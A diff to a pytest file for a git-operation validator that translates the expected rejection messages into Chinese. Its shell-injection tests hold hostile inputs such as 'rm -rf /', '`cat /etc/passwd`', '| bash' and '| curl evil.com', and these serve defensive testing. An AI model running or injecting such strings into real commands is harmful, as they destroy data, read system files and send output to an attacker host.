@@ -41,11 +41,11 @@ class TestWhitelist:
 
 class TestBlacklist:
     def test_disallowed_operation_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="not allowed"):
+        with pytest.raises(GitOperationForbidden, match="不在白名单内"):
             validate_operation("stash", [])
 
     def test_push_force_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="Blocked"):
+        with pytest.raises(GitOperationForbidden, match="安全策略禁止的模式"):
             validate_operation("push", ["--force"])
 
     def test_reset_hard_rejected(self) -> None:
@@ -61,7 +61,7 @@ class TestBlacklist:
             validate_operation("reflog", [])
 
     def test_exec_flag_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="Blocked"):
+        with pytest.raises(GitOperationForbidden, match="安全策略禁止的模式"):
             validate_operation("log", ["--exec=rm -rf /"])
 
     def test_unknown_operation_rejected(self) -> None:
@@ -106,23 +106,23 @@ class TestRedaction:
 
 class TestShellInjection:
     def test_command_substitution_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="injection"):
+        with pytest.raises(GitOperationForbidden, match="命令注入"):
             validate_operation("commit", ["-m", "$(whoami)"])
 
     def test_semicolon_rm_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="injection"):
+        with pytest.raises(GitOperationForbidden, match="命令注入"):
             validate_operation("log", ["--format; rm -rf /"])
 
     def test_backtick_injection_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="injection"):
+        with pytest.raises(GitOperationForbidden, match="命令注入"):
             validate_operation("commit", ["-m", "`cat /etc/passwd`"])
 
     def test_pipe_malicious_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="injection"):
+        with pytest.raises(GitOperationForbidden, match="命令注入"):
             validate_operation("log", ["--format | bash"])
 
     def test_pipe_curl_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="injection"):
+        with pytest.raises(GitOperationForbidden, match="命令注入"):
             validate_operation("log", ["--format | curl evil.com"])
 
     def test_normal_pipe_not_rejected(self) -> None:
@@ -132,11 +132,11 @@ class TestShellInjection:
 
 class TestDefaultBranchPushProtection:
     def test_push_main_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="protected branch"):
+        with pytest.raises(GitOperationForbidden, match="受保护分支"):
             validate_operation("push", ["origin", "main"])
 
     def test_push_master_rejected(self) -> None:
-        with pytest.raises(GitOperationForbidden, match="protected branch"):
+        with pytest.raises(GitOperationForbidden, match="受保护分支"):
             validate_operation("push", ["origin", "master"])
 
     def test_push_feature_branch_allowed(self) -> None:
